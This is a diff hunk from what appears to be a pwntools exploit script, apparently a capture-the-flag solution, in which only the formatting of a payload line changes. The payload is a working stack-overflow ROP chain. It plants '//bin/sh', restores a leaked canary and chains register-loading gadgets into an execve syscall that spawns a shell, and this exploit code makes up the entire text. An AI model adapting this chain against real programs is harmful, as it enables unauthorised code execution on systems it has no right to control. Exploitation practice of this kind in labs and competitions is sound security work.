@@ -82,8 +82,9 @@ syscall_gadget += offset
 # +----------------------+
 
 payload = p64(0x68732f6e69622f2f).ljust(8, b'\x00')+b'\x00'*32 + canary + b'A'*8 + p64(rdi_gadget).ljust(8, b'\x00') + \
-          p64(buf).ljust(8, b'\x00') + p64(rsi_gadget).ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + \
-          p64(rdx_gadget).ljust(8, b'\x00') + p64(59) .ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + p64(syscall_gadget).ljust(8, b'\x00')
+          p64(buf).ljust(8, b'\x00') + p64(rsi_gadget).ljust(8, b'\x00') + p64(0).ljust(8, b'\x00') + \
+          p64(rdx_gadget).ljust(8, b'\x00') + p64(59).ljust(8, b'\x00') + p64(0).ljust(8, b'\x00') + \
+          p64(0).ljust(8, b'\x00') + p64(syscall_gadget).ljust(8, b'\x00')
 # print('payload:', payload)
 
 r.recvuntil(b'message: ')
